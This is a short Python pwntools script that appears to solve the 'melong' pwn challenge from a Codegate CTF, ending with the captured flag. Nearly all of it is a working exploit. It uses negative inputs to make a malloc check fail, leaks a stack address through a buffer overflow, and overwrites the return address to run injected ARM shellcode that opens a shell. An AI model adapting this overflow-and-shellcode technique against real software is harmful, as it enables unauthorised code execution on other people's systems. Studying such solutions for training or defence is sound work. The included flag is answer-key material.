#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "arm"

if args.REMOTE:
    r = remote("ch41l3ng3s.codegate.kr", 1199)
else:
    #r = process(["qemu-arm-static", "-L", "/usr/arm-linux-gnueabi/", "-g", "4444", "./melong"])
    r = process(["qemu-arm-static", "-L", "/usr/arm-linux-gnueabi/", "./melong"])

# check
r.sendlineafter("Type the number:", "1")
r.sendlineafter("Your height(meters) : ", "1")
r.sendlineafter("Your weight(kilograms) : ", "-1")

# make malloc in PT() failed to bypass check
r.sendlineafter("Type the number:", "3")
r.sendlineafter("How long do you want to take personal training?", "-1")

# bof to leak
r.sendlineafter("Type the number:", "4")
r.sendline("\xff" * 91)
r.recvline()
buf = u32(r.recv(4)) - 0x1a4
log.info("buf = " + hex(buf))

# ret2shellcode cuz it's qemu
r.sendlineafter("Type the number:", "4")
r.sendline("A" * 84
       + p32(buf+88)
       + asm(shellcraft.arm.sh())
)
r.sendlineafter("Type the number:", "6")

r.interactive()

# FLAG{D0n7_7h1nk_7ha7_1_Can_3xp1ain_it}

